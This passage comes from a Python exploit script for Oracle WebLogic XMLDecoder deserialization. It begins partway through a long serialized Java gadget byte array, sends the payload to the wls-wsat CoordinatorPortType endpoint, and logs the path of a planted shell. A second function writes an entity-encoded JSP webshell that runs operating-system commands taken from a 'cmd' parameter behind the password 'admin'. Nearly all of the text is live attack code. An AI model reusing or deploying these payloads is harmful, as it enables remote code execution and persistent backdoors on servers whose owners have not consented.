index=\"3786\"><byte>108</byte></void><void index=\"3787\"><byte>105</byte></void><void index=\"3788\"><byte>122</byte></void><void index=\"3789\"><byte>97</byte></void><void index=\"3790\"><byte>98</byte></void><void index=\"3791\"><byte>108</byte></void><void index=\"3792\"><byte>101</byte></void><void index=\"3793\"><byte>1</byte></void><void index=\"3794\"><byte>0</byte></void><void index=\"3795\"><byte>31</byte></void><void index=\"3796\"><byte>121</byte></void><void index=\"3797\"><byte>115</byte></void><void index=\"3798\"><byte>111</byte></void><void index=\"3799\"><byte>115</byte></void><void index=\"3800\"><byte>101</byte></void><void index=\"3801\"><byte>114</byte></void><void index=\"3802\"><byte>105</byte></void><void index=\"3803\"><byte>97</byte></void><void index=\"3804\"><byte>108</byte></void><void index=\"3805\"><byte>47</byte></void><void index=\"3806\"><byte>112</byte></void><void index=\"3807\"><byte>97</byte></void><void index=\"3808\"><byte>121</byte></void><void index=\"3809\"><byte>108</byte></void><void index=\"3810\"><byte>111</byte></void><void index=\"3811\"><byte>97</byte></void><void index=\"3812\"><byte>100</byte></void><void index=\"3813\"><byte>115</byte></void><void index=\"3814\"><byte>47</byte></void><void index=\"3815\"><byte>117</byte></void><void index=\"3816\"><byte>116</byte></void><void index=\"3817\"><byte>105</byte></void><void index=\"3818\"><byte>108</byte></void><void index=\"3819\"><byte>47</byte></void><void index=\"3820\"><byte>71</byte></void><void index=\"3821\"><byte>97</byte></void><void index=\"3822\"><byte>100</byte></void><void index=\"3823\"><byte>103</byte></void><void index=\"3824\"><byte>101</byte></void><void index=\"3825\"><byte>116</byte></void><void index=\"3826\"><byte>115</byte></void><void index=\"3827\"><byte>0</byte></void><void index=\"3828\"><byte>33</byte></void><void index=\"3829\"><byte>0</byte></void><void index=\"3830\"><byte>2</byte></void><void index=\"3831\"><byte>0</byte></void><void index=\"3832\"><byte>3</byte></void><void index=\"3833\"><byte>0</byte></void><void index=\"3834\"><byte>1</byte></void><void index=\"3835\"><byte>0</byte></void><void index=\"3836\"><byte>4</byte></void><void index=\"3837\"><byte>0</byte></void><void index=\"3838\"><byte>1</byte></void><void index=\"3839\"><byte>0</byte></void><void index=\"3840\"><byte>26</byte></void><void index=\"3841\"><byte>0</byte></void><void index=\"3842\"><byte>5</byte></void><void index=\"3843\"><byte>0</byte></void><void index=\"3844\"><byte>6</byte></void><void index=\"3845\"><byte>0</byte></void><void index=\"3846\"><byte>1</byte></void><void index=\"3847\"><byte>0</byte></void><void index=\"3848\"><byte>7</byte></void><void index=\"3849\"><byte>0</byte></void><void index=\"3850\"><byte>0</byte></void><void index=\"3851\"><byte>0</byte></void><void index=\"3852\"><byte>2</byte></void><void index=\"3853\"><byte>0</byte></void><void index=\"3854\"><byte>8</byte></void><void index=\"3855\"><byte>0</byte></void><void index=\"3856\"><byte>1</byte></void><void index=\"3857\"><byte>0</byte></void><void index=\"3858\"><byte>1</byte></void><void index=\"3859\"><byte>0</byte></void><void index=\"3860\"><byte>10</byte></void><void index=\"3861\"><byte>0</byte></void><void index=\"3862\"><byte>11</byte></void><void index=\"3863\"><byte>0</byte></void><void index=\"3864\"><byte>1</byte></void><void index=\"3865\"><byte>0</byte></void><void index=\"3866\"><byte>12</byte></void><void index=\"3867\"><byte>0</byte></void><void index=\"3868\"><byte>0</byte></void><void index=\"3869\"><byte>0</byte></void><void index=\"3870\"><byte>47</byte></void><void index=\"3871\"><byte>0</byte></void><void index=\"3872\"><byte>1</byte></void><void index=\"3873\"><byte>0</byte></void><void index=\"3874\"><byte>1</byte></void><void index=\"3875\"><byte>0</byte></void><void index=\"3876\"><byte>0</byte></void><void index=\"3877\"><byte>0</byte></void><void index=\"3878\"><byte>5</byte></void><void index=\"3879\"><byte>42</byte></void><void index=\"3880\"><byte>-73</byte></void><void index=\"3881\"><byte>0</byte></void><void index=\"3882\"><byte>1</byte></void><void index=\"3883\"><byte>-79</byte></void><void index=\"3884\"><byte>0</byte></void><void index=\"3885\"><byte>0</byte></void><void index=\"3886\"><byte>0</byte></void><void index=\"3887\"><byte>2</byte></void><void index=\"3888\"><byte>0</byte></void><void index=\"3889\"><byte>13</byte></void><void index=\"3890\"><byte>0</byte></void><void index=\"3891\"><byte>0</byte></void><void index=\"3892\"><byte>0</byte></void><void index=\"3893\"><byte>6</byte></void><void index=\"3894\"><byte>0</byte></void><void index=\"3895\"><byte>1</byte></void><void index=\"3896\"><byte>0</byte></void><void index=\"3897\"><byte>0</byte></void><void index=\"3898\"><byte>0</byte></void><void index=\"3899\"><byte>60</byte></void><void index=\"3900\"><byte>0</byte></void><void index=\"3901\"><byte>14</byte></void><void index=\"3902\"><byte>0</byte></void><void index=\"3903\"><byte>0</byte></void><void index=\"3904\"><byte>0</byte></void><void index=\"3905\"><byte>12</byte></void><void index=\"3906\"><byte>0</byte></void><void index=\"3907\"><byte>1</byte></void><void index=\"3908\"><byte>0</byte></void><void index=\"3909\"><byte>0</byte></void><void index=\"3910\"><byte>0</byte></void><void index=\"3911\"><byte>5</byte></void><void index=\"3912\"><byte>0</byte></void><void index=\"3913\"><byte>15</byte></void><void index=\"3914\"><byte>0</byte></void><void index=\"3915\"><byte>18</byte></void><void index=\"3916\"><byte>0</byte></void><void index=\"3917\"><byte>0</byte></void><void index=\"3918\"><byte>0</byte></void><void index=\"3919\"><byte>2</byte></void><void index=\"3920\"><byte>0</byte></void><void index=\"3921\"><byte>19</byte></void><void index=\"3922\"><byte>0</byte></void><void index=\"3923\"><byte>0</byte></void><void index=\"3924\"><byte>0</byte></void><void index=\"3925\"><byte>2</byte></void><void index=\"3926\"><byte>0</byte></void><void index=\"3927\"><byte>20</byte></void><void index=\"3928\"><byte>0</byte></void><void index=\"3929\"><byte>17</byte></void><void index=\"3930\"><byte>0</byte></void><void index=\"3931\"><byte>0</byte></void><void index=\"3932\"><byte>0</byte></void><void index=\"3933\"><byte>10</byte></void><void index=\"3934\"><byte>0</byte></void><void index=\"3935\"><byte>1</byte></void><void index=\"3936\"><byte>0</byte></void><void index=\"3937\"><byte>2</byte></void><void index=\"3938\"><byte>0</byte></void><void index=\"3939\"><byte>22</byte></void><void index=\"3940\"><byte>0</byte></void><void index=\"3941\"><byte>16</byte></void><void index=\"3942\"><byte>0</byte></void><void index=\"3943\"><byte>9</byte></void><void index=\"3944\"><byte>112</byte></void><void index=\"3945\"><byte>116</byte></void><void index=\"3946\"><byte>0</byte></void><void index=\"3947\"><byte>4</byte></void><void index=\"3948\"><byte>80</byte></void><void index=\"3949\"><byte>119</byte></void><void index=\"3950\"><byte>110</byte></void><void index=\"3951\"><byte>114</byte></void><void index=\"3952\"><byte>112</byte></void><void index=\"3953\"><byte>119</byte></void><void index=\"3954\"><byte>1</byte></void><void index=\"3955\"><byte>0</byte></void><void index=\"3956\"><byte>120</byte></void><void index=\"3957\"><byte>115</byte></void><void index=\"3958\"><byte>125</byte></void><void index=\"3959\"><byte>0</byte></void><void index=\"3960\"><byte>0</byte></void><void index=\"3961\"><byte>0</byte></void><void index=\"3962\"><byte>1</byte></void><void index=\"3963\"><byte>0</byte></void><void index=\"3964\"><byte>29</byte></void><void index=\"3965\"><byte>106</byte></void><void index=\"3966\"><byte>97</byte></void><void index=\"3967\"><byte>118</byte></void><void index=\"3968\"><byte>97</byte></void><void index=\"3969\"><byte>120</byte></void><void index=\"3970\"><byte>46</byte></void><void index=\"3971\"><byte>120</byte></void><void index=\"3972\"><byte>109</byte></void><void index=\"3973\"><byte>108</byte></void><void index=\"3974\"><byte>46</byte></void><void index=\"3975\"><byte>116</byte></void><void index=\"3976\"><byte>114</byte></void><void index=\"3977\"><byte>97</byte></void><void index=\"3978\"><byte>110</byte></void><void index=\"3979\"><byte>115</byte></void><void index=\"3980\"><byte>102</byte></void><void index=\"3981\"><byte>111</byte></void><void index=\"3982\"><byte>114</byte></void><void index=\"3983\"><byte>109</byte></void><void index=\"3984\"><byte>46</byte></void><void index=\"3985\"><byte>84</byte></void><void index=\"3986\"><byte>101</byte></void><void index=\"3987\"><byte>109</byte></void><void index=\"3988\"><byte>112</byte></void><void index=\"3989\"><byte>108</byte></void><void index=\"3990\"><byte>97</byte></void><void index=\"3991\"><byte>116</byte></void><void index=\"3992\"><byte>101</byte></void><void index=\"3993\"><byte>115</byte></void><void index=\"3994\"><byte>120</byte></void><void index=\"3995\"><byte>114</byte></void><void index=\"3996\"><byte>0</byte></void><void index=\"3997\"><byte>23</byte></void><void index=\"3998\"><byte>106</byte></void><void index=\"3999\"><byte>97</byte></void><void index=\"4000\"><byte>118</byte></void><void index=\"4001\"><byte>97</byte></void><void index=\"4002\"><byte>46</byte></void><void index=\"4003\"><byte>108</byte></void><void index=\"4004\"><byte>97</byte></void><void index=\"4005\"><byte>110</byte></void><void index=\"4006\"><byte>103</byte></void><void index=\"4007\"><byte>46</byte></void><void index=\"4008\"><byte>114</byte></void><void index=\"4009\"><byte>101</byte></void><void index=\"4010\"><byte>102</byte></void><void index=\"4011\"><byte>108</byte></void><void index=\"4012\"><byte>101</byte></void><void index=\"4013\"><byte>99</byte></void><void index=\"4014\"><byte>116</byte></void><void index=\"4015\"><byte>46</byte></void><void index=\"4016\"><byte>80</byte></void><void index=\"4017\"><byte>114</byte></void><void index=\"4018\"><byte>111</byte></void><void index=\"4019\"><byte>120</byte></void><void index=\"4020\"><byte>121</byte></void><void index=\"4021\"><byte>-31</byte></void><void index=\"4022\"><byte>39</byte></void><void index=\"4023\"><byte>-38</byte></void><void index=\"4024\"><byte>32</byte></void><void index=\"4025\"><byte>-52</byte></void><void index=\"4026\"><byte>16</byte></void><void index=\"4027\"><byte>67</byte></void><void index=\"4028\"><byte>-53</byte></void><void index=\"4029\"><byte>2</byte></void><void index=\"4030\"><byte>0</byte></void><void index=\"4031\"><byte>1</byte></void><void index=\"4032\"><byte>76</byte></void><void index=\"4033\"><byte>0</byte></void><void index=\"4034\"><byte>1</byte></void><void index=\"4035\"><byte>104</byte></void><void index=\"4036\"><byte>116</byte></void><void index=\"4037\"><byte>0</byte></void><void index=\"4038\"><byte>37</byte></void><void index=\"4039\"><byte>76</byte></void><void index=\"4040\"><byte>106</byte></void><void index=\"4041\"><byte>97</byte></void><void index=\"4042\"><byte>118</byte></void><void index=\"4043\"><byte>97</byte></void><void index=\"4044\"><byte>47</byte></void><void index=\"4045\"><byte>108</byte></void><void index=\"4046\"><byte>97</byte></void><void index=\"4047\"><byte>110</byte></void><void index=\"4048\"><byte>103</byte></void><void index=\"4049\"><byte>47</byte></void><void index=\"4050\"><byte>114</byte></void><void index=\"4051\"><byte>101</byte></void><void index=\"4052\"><byte>102</byte></void><void index=\"4053\"><byte>108</byte></void><void index=\"4054\"><byte>101</byte></void><void index=\"4055\"><byte>99</byte></void><void index=\"4056\"><byte>116</byte></void><void index=\"4057\"><byte>47</byte></void><void index=\"4058\"><byte>73</byte></void><void index=\"4059\"><byte>110</byte></void><void index=\"4060\"><byte>118</byte></void><void index=\"4061\"><byte>111</byte></void><void index=\"4062\"><byte>99</byte></void><void index=\"4063\"><byte>97</byte></void><void index=\"4064\"><byte>116</byte></void><void index=\"4065\"><byte>105</byte></void><void index=\"4066\"><byte>111</byte></void><void index=\"4067\"><byte>110</byte></void><void index=\"4068\"><byte>72</byte></void><void index=\"4069\"><byte>97</byte></void><void index=\"4070\"><byte>110</byte></void><void index=\"4071\"><byte>100</byte></void><void index=\"4072\"><byte>108</byte></void><void index=\"4073\"><byte>101</byte></void><void index=\"4074\"><byte>114</byte></void><void index=\"4075\"><byte>59</byte></void><void index=\"4076\"><byte>120</byte></void><void index=\"4077\"><byte>112</byte></void><void index=\"4078\"><byte>115</byte></void><void index=\"4079\"><byte>114</byte></void><void index=\"4080\"><byte>0</byte></void><void index=\"4081\"><byte>50</byte></void><void index=\"4082\"><byte>115</byte></void><void index=\"4083\"><byte>117</byte></void><void index=\"4084\"><byte>110</byte></void><void index=\"4085\"><byte>46</byte></void><void index=\"4086\"><byte>114</byte></void><void index=\"4087\"><byte>101</byte></void><void index=\"4088\"><byte>102</byte></void><void index=\"4089\"><byte>108</byte></void><void index=\"4090\"><byte>101</byte></void><void index=\"4091\"><byte>99</byte></void><void index=\"4092\"><byte>116</byte></void><void index=\"4093\"><byte>46</byte></void><void index=\"4094\"><byte>97</byte></void><void index=\"4095\"><byte>110</byte></void><void index=\"4096\"><byte>110</byte></void><void index=\"4097\"><byte>111</byte></void><void index=\"4098\"><byte>116</byte></void><void index=\"4099\"><byte>97</byte></void><void index=\"4100\"><byte>116</byte></void><void index=\"4101\"><byte>105</byte></void><void index=\"4102\"><byte>111</byte></void><void index=\"4103\"><byte>110</byte></void><void index=\"4104\"><byte>46</byte></void><void index=\"4105\"><byte>65</byte></void><void index=\"4106\"><byte>110</byte></void><void index=\"4107\"><byte>110</byte></void><void index=\"4108\"><byte>111</byte></void><void index=\"4109\"><byte>116</byte></void><void index=\"4110\"><byte>97</byte></void><void index=\"4111\"><byte>116</byte></void><void index=\"4112\"><byte>105</byte></void><void index=\"4113\"><byte>111</byte></void><void index=\"4114\"><byte>110</byte></void><void index=\"4115\"><byte>73</byte></void><void index=\"4116\"><byte>110</byte></void><void index=\"4117\"><byte>118</byte></void><void index=\"4118\"><byte>111</byte></void><void index=\"4119\"><byte>99</byte></void><void index=\"4120\"><byte>97</byte></void><void index=\"4121\"><byte>116</byte></void><void index=\"4122\"><byte>105</byte></void><void index=\"4123\"><byte>111</byte></void><void index=\"4124\"><byte>110</byte></void><void index=\"4125\"><byte>72</byte></void><void index=\"4126\"><byte>97</byte></void><void index=\"4127\"><byte>110</byte></void><void index=\"4128\"><byte>100</byte></void><void index=\"4129\"><byte>108</byte></void><void index=\"4130\"><byte>101</byte></void><void index=\"4131\"><byte>114</byte></void><void index=\"4132\"><byte>85</byte></void><void index=\"4133\"><byte>-54</byte></void><void index=\"4134\"><byte>-11</byte></void><void index=\"4135\"><byte>15</byte></void><void index=\"4136\"><byte>21</byte></void><void index=\"4137\"><byte>-53</byte></void><void index=\"4138\"><byte>126</byte></void><void index=\"4139\"><byte>-91</byte></void><void index=\"4140\"><byte>2</byte></void><void index=\"4141\"><byte>0</byte></void><void index=\"4142\"><byte>2</byte></void><void index=\"4143\"><byte>76</byte></void><void index=\"4144\"><byte>0</byte></void><void index=\"4145\"><byte>12</byte></void><void index=\"4146\"><byte>109</byte></void><void index=\"4147\"><byte>101</byte></void><void index=\"4148\"><byte>109</byte></void><void index=\"4149\"><byte>98</byte></void><void index=\"4150\"><byte>101</byte></void><void index=\"4151\"><byte>114</byte></void><void index=\"4152\"><byte>86</byte></void><void index=\"4153\"><byte>97</byte></void><void index=\"4154\"><byte>108</byte></void><void index=\"4155\"><byte>117</byte></void><void index=\"4156\"><byte>101</byte></void><void index=\"4157\"><byte>115</byte></void><void index=\"4158\"><byte>116</byte></void><void index=\"4159\"><byte>0</byte></void><void index=\"4160\"><byte>15</byte></void><void index=\"4161\"><byte>76</byte></void><void index=\"4162\"><byte>106</byte></void><void index=\"4163\"><byte>97</byte></void><void index=\"4164\"><byte>118</byte></void><void index=\"4165\"><byte>97</byte></void><void index=\"4166\"><byte>47</byte></void><void index=\"4167\"><byte>117</byte></void><void index=\"4168\"><byte>116</byte></void><void index=\"4169\"><byte>105</byte></void><void index=\"4170\"><byte>108</byte></void><void index=\"4171\"><byte>47</byte></void><void index=\"4172\"><byte>77</byte></void><void index=\"4173\"><byte>97</byte></void><void index=\"4174\"><byte>112</byte></void><void index=\"4175\"><byte>59</byte></void><void index=\"4176\"><byte>76</byte></void><void index=\"4177\"><byte>0</byte></void><void index=\"4178\"><byte>4</byte></void><void index=\"4179\"><byte>116</byte></void><void index=\"4180\"><byte>121</byte></void><void index=\"4181\"><byte>112</byte></void><void index=\"4182\"><byte>101</byte></void><void index=\"4183\"><byte>116</byte></void><void index=\"4184\"><byte>0</byte></void><void index=\"4185\"><byte>17</byte></void><void index=\"4186\"><byte>76</byte></void><void index=\"4187\"><byte>106</byte></void><void index=\"4188\"><byte>97</byte></void><void index=\"4189\"><byte>118</byte></void><void index=\"4190\"><byte>97</byte></void><void index=\"4191\"><byte>47</byte></void><void index=\"4192\"><byte>108</byte></void><void index=\"4193\"><byte>97</byte></void><void index=\"4194\"><byte>110</byte></void><void index=\"4195\"><byte>103</byte></void><void index=\"4196\"><byte>47</byte></void><void index=\"4197\"><byte>67</byte></void><void index=\"4198\"><byte>108</byte></void><void index=\"4199\"><byte>97</byte></void><void index=\"4200\"><byte>115</byte></void><void index=\"4201\"><byte>115</byte></void><void index=\"4202\"><byte>59</byte></void><void index=\"4203\"><byte>120</byte></void><void index=\"4204\"><byte>112</byte></void><void index=\"4205\"><byte>115</byte></void><void index=\"4206\"><byte>114</byte></void><void index=\"4207\"><byte>0</byte></void><void index=\"4208\"><byte>17</byte></void><void index=\"4209\"><byte>106</byte></void><void index=\"4210\"><byte>97</byte></void><void index=\"4211\"><byte>118</byte></void><void index=\"4212\"><byte>97</byte></void><void index=\"4213\"><byte>46</byte></void><void index=\"4214\"><byte>117</byte></void><void index=\"4215\"><byte>116</byte></void><void index=\"4216\"><byte>105</byte></void><void index=\"4217\"><byte>108</byte></void><void index=\"4218\"><byte>46</byte></void><void index=\"4219\"><byte>72</byte></void><void index=\"4220\"><byte>97</byte></void><void index=\"4221\"><byte>115</byte></void><void index=\"4222\"><byte>104</byte></void><void index=\"4223\"><byte>77</byte></void><void index=\"4224\"><byte>97</byte></void><void index=\"4225\"><byte>112</byte></void><void index=\"4226\"><byte>5</byte></void><void index=\"4227\"><byte>7</byte></void><void index=\"4228\"><byte>-38</byte></void><void index=\"4229\"><byte>-63</byte></void><void index=\"4230\"><byte>-61</byte></void><void index=\"4231\"><byte>22</byte></void><void index=\"4232\"><byte>96</byte></void><void index=\"4233\"><byte>-47</byte></void><void index=\"4234\"><byte>3</byte></void><void index=\"4235\"><byte>0</byte></void><void index=\"4236\"><byte>2</byte></void><void index=\"4237\"><byte>70</byte></void><void index=\"4238\"><byte>0</byte></void><void index=\"4239\"><byte>10</byte></void><void index=\"4240\"><byte>108</byte></void><void index=\"4241\"><byte>111</byte></void><void index=\"4242\"><byte>97</byte></void><void index=\"4243\"><byte>100</byte></void><void index=\"4244\"><byte>70</byte></void><void index=\"4245\"><byte>97</byte></void><void index=\"4246\"><byte>99</byte></void><void index=\"4247\"><byte>116</byte></void><void index=\"4248\"><byte>111</byte></void><void index=\"4249\"><byte>114</byte></void><void index=\"4250\"><byte>73</byte></void><void index=\"4251\"><byte>0</byte></void><void index=\"4252\"><byte>9</byte></void><void index=\"4253\"><byte>116</byte></void><void index=\"4254\"><byte>104</byte></void><void index=\"4255\"><byte>114</byte></void><void index=\"4256\"><byte>101</byte></void><void index=\"4257\"><byte>115</byte></void><void index=\"4258\"><byte>104</byte></void><void index=\"4259\"><byte>111</byte></void><void index=\"4260\"><byte>108</byte></void><void index=\"4261\"><byte>100</byte></void><void index=\"4262\"><byte>120</byte></void><void index=\"4263\"><byte>112</byte></void><void index=\"4264\"><byte>63</byte></void><void index=\"4265\"><byte>64</byte></void><void index=\"4266\"><byte>0</byte></void><void index=\"4267\"><byte>0</byte></void><void index=\"4268\"><byte>0</byte></void><void index=\"4269\"><byte>0</byte></void><void index=\"4270\"><byte>0</byte></void><void index=\"4271\"><byte>12</byte></void><void index=\"4272\"><byte>119</byte></void><void index=\"4273\"><byte>8</byte></void><void index=\"4274\"><byte>0</byte></void><void index=\"4275\"><byte>0</byte></void><void index=\"4276\"><byte>0</byte></void><void index=\"4277\"><byte>16</byte></void><void index=\"4278\"><byte>0</byte></void><void index=\"4279\"><byte>0</byte></void><void index=\"4280\"><byte>0</byte></void><void index=\"4281\"><byte>1</byte></void><void index=\"4282\"><byte>116</byte></void><void index=\"4283\"><byte>0</byte></void><void index=\"4284\"><byte>8</byte></void><void index=\"4285\"><byte>102</byte></void><void index=\"4286\"><byte>53</byte></void><void index=\"4287\"><byte>97</byte></void><void index=\"4288\"><byte>53</byte></void><void index=\"4289\"><byte>97</byte></void><void index=\"4290\"><byte>54</byte></void><void index=\"4291\"><byte>48</byte></void><void index=\"4292\"><byte>56</byte></void><void index=\"4293\"><byte>113</byte></void><void index=\"4294\"><byte>0</byte></void><void index=\"4295\"><byte>126</byte></void><void index=\"4296\"><byte>0</byte></void><void index=\"4297\"><byte>9</byte></void><void index=\"4298\"><byte>120</byte></void><void index=\"4299\"><byte>118</byte></void><void index=\"4300\"><byte>114</byte></void><void index=\"4301\"><byte>0</byte></void><void index=\"4302\"><byte>29</byte></void><void index=\"4303\"><byte>106</byte></void><void index=\"4304\"><byte>97</byte></void><void index=\"4305\"><byte>118</byte></void><void index=\"4306\"><byte>97</byte></void><void index=\"4307\"><byte>120</byte></void><void index=\"4308\"><byte>46</byte></void><void index=\"4309\"><byte>120</byte></void><void index=\"4310\"><byte>109</byte></void><void index=\"4311\"><byte>108</byte></void><void index=\"4312\"><byte>46</byte></void><void index=\"4313\"><byte>116</byte></void><void index=\"4314\"><byte>114</byte></void><void index=\"4315\"><byte>97</byte></void><void index=\"4316\"><byte>110</byte></void><void index=\"4317\"><byte>115</byte></void><void index=\"4318\"><byte>102</byte></void><void index=\"4319\"><byte>111</byte></void><void index=\"4320\"><byte>114</byte></void><void index=\"4321\"><byte>109</byte></void><void index=\"4322\"><byte>46</byte></void><void index=\"4323\"><byte>84</byte></void><void index=\"4324\"><byte>101</byte></void><void index=\"4325\"><byte>109</byte></void><void index=\"4326\"><byte>112</byte></void><void index=\"4327\"><byte>108</byte></void><void index=\"4328\"><byte>97</byte></void><void index=\"4329\"><byte>116</byte></void><void index=\"4330\"><byte>101</byte></void><void index=\"4331\"><byte>115</byte></void><void index=\"4332\"><byte>0</byte></void><void index=\"4333\"><byte>0</byte></void><void index=\"4334\"><byte>0</byte></void><void index=\"4335\"><byte>0</byte></void><void index=\"4336\"><byte>0</byte></void><void index=\"4337\"><byte>0</byte></void><void index=\"4338\"><byte>0</byte></void><void index=\"4339\"><byte>0</byte></void><void index=\"4340\"><byte>0</byte></void><void index=\"4341\"><byte>0</byte></void><void index=\"4342\"><byte>0</byte></void><void index=\"4343\"><byte>120</byte></void><void index=\"4344\"><byte>112</byte></void><void index=\"4345\"><byte>120</byte></void></array> </void></class> </work:WorkContext> </soapenv:Header> <soapenv:Body></soapenv:Body></soapenv:Envelope>''' url = \" %s /wls-wsat/CoordinatorPortType\" % ( ip ) rsp = requests . post ( url , data = body , verify = False , headers = headers ) logger . info ( \" \\r\\n Shell\u5730\u5740\uff1a %s /bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\" % ( ip )) #print(\"Shell\u5730\u5740\uff1a %s/bea_wls_internal/demo.jsp?pwd=admin&cmd=ipconfig\"%(ip)) def webshell_12_1_3 ( ip ): body = '''<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action/><wsa:RelatesTo/><asy:onAsyncDelivery/> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <class><string>org.slf4j.ext.EventData</string><void><string> <![CDATA[<java> <object class=\"java.io.PrintWriter\"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/demo.jsp</string> <void method=\"println\"> <string>&#x3c;&#x25;&#x40;&#x20;&#x70;&#x61;&#x67;&#x65;&#x20;&#x6c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x22;&#x20;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x54;&#x79;&#x70;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x3b;&#x20;&#x63;&#x68;&#x61;&#x72;&#x73;&#x65;&#x74;&#x3d;&#x47;&#x42;&#x4b;&#x22;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x61;&#x67;&#x65;&#x45;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x20;&#x50;&#x55;&#x42;&#x4c;&#x49;&#x43;&#x20;&#x22;&#x2d;&#x2f;&#x2f;&#x57;&#x33;&#x43;&#x2f;&#x2f;&#x44;&#x54;&#x44;&#x20;&#x48;&#x54;&#x4d;&#x4c;&#x20;&#x34;&#x2e;&#x30;&#x31;&#x20;&#x54;&#x72;&#x61;&#x6e;&#x73;&#x69;&#x74;&#x69;&#x6f;&#x6e;&#x61;&#x6c;&#x2f;&#x2f;&#x45;&#x4e;&#x22;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x54;&#x52;&#x2f;&#x68;&#x74;&#x6d;&#x6c;&#x34;&#x2f;&#x6c;&#x6f;&#x6f;&#x73;&#x65;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x3e;&#x0a;&#x3c;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x66;&#x20;&#x28;&#x22;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x22;&#x2e;&#x65;&#x71;&#x75;&#x61;&#x6c;&#x73;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x70;&#x77;&#x64;&#x22;&#x29;&#x29;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6a;&#x61;&#x76;&#x61;&#x2e;&#x69;&#x6f;&#x2e;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x2e;&#x67;&#x65;&#x74;&#x52;&#x75;&#x6e;&#x74;&#x69;&#x6d;&#x65;&#x28;&#x29;&#x2e;&#x65;&#x78;&#x65;&#x63;&#x28;&#x72;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x67;&#x65;&#x74;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x65;&#x74;&#x65;&#x72;&#x28;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x29;&#x29;&#x2e;&#x67;&#x65;&#x74;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6d;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x69;&#x6e;&#x74;&#x20;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x2d;&#x31;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x5d;&#x20;&#x62;&#x79;&#x74;&#x65;&#x73;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x62;&#x79;&#x74;&#x65;&#x5b;&#x34;&#x30;&#x39;&#x32;&#x5d;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x3c;&#x70;&#x72;&#x65;&#x3e;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x77;&#x68;&#x69;&#x6c;&#x65;&#x20;&#x28;&#x28;&#x6c;&#x65;&#x6e;&#x20;&#x3d;&#x20;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x2e;&#x72;&#x65;&#x61;&#x64;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x29;&#x29;&#x20;&#x21;&#x3d;&#x20;&#x2d;&#x31;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x6c;&#x6e;&#x28;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x62;&#x79;&#x74;&#x65;&#x73;&#x2c;&#x20;&#x22;&#x47;&#x42;&#x4b;&#x22;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#